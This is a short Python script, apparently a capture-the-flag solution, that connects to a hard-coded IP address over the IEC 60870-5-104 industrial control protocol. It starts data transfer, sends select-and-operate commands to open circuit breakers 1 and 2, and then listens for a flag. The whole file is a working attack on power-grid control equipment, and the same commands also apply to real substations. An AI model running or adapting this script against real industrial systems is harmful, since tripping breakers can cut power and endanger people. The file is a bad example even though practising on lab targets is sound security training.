#!/usr/bin/env python3
import socket
import time

HOST = '169.58.126.107'
PORT = 6004

def main():
    s = socket.socket()
    s.settimeout(300)
    try:
        s.connect((HOST, PORT))
        # STARTDT
        s.send(bytes([0x68, 0x04, 0x07, 0x00, 0x00, 0x00]))
        time.sleep(2)
        r = s.recv(1024)
        print('start:', r.hex() if r else 'none')
        
        ca = bytes([0x01, 0x00])
        # Try opening critical breaker - maybe breaker 1
        ioa = bytes([0x01, 0x00, 0x00])
        asdu = bytes([45, 0x01, 0x06, 0x00]) + ca + ioa + bytes([0x01]) # select
        s.send(bytes([0x68, len(asdu)+4, 0x00,0x00,0x00,0x00]) + asdu)
        time.sleep(1)
        try:
            print(s.recv(512).hex())
        except:
            pass
        asdu = bytes([45, 0x01, 0x06, 0x00]) + ca + ioa + bytes([0x81]) # operate
        s.send(bytes([0x68, len(asdu)+4, 0x02,0x00,0x00,0x00]) + asdu)
        time.sleep(1)
        try:
            print(s.recv(512).hex())
        except:
            pass
        
        # Also try breaker 2
        ioa = bytes([0x02, 0x00, 0x00])
        asdu = bytes([45, 0x01, 0x06, 0x00]) + ca + ioa + bytes([0x81])
        s.send(bytes([0x68, len(asdu)+4, 0x04,0x00,0x00,0x00]) + asdu)
        time.sleep(2)
        try:
            print(s.recv(512).hex())
        except:
            pass
        
        print('waiting for flag...')
        start = time.time()
        while time.time() - start < 180:
            try:
                s.settimeout(15)
                r = s.recv(8192)
                if not r: 
                    print('closed')
                    break
                print('GOT:', r.hex())
                if b'CTF{' in r:
                    print('[FLAG]', r)
                    break
            except socket.timeout:
                try:
                    s.send(bytes([0x68,0x04,0x43,0x00,0x00,0x00]))
                except:
                    break
                continue
            except Exception as e:
                print(e)
                break
    except Exception as e:
        print(e)
    finally:
        s.close()

if __name__ == '__main__':
    main()
